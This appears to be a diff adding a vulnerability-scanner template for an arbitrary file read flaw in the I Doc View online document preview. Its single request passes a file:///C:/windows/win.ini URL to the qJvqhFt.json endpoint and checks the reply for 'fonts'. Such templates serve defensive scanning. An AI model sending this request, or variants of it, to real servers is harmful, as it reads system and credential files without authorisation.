@@ -1,0 +1,16 @@
+id:
+info:
+  name: I Doc View 在线文档预览 qJvqhFt.json 任意文件读取
+  severity: 4
+  description:
+  details:
+  repair:
+requests1:
+  method: GET
+  path: /view/qJvqhFt.json?start=1&size=5&url=file%3A%2F%2F%2FC%3A%2Fwindows%2Fwin.ini&idocv_auth=sapi
+response1:
+  headers:
+  body: fonts
+  code: 200
+requests2:
+response2:
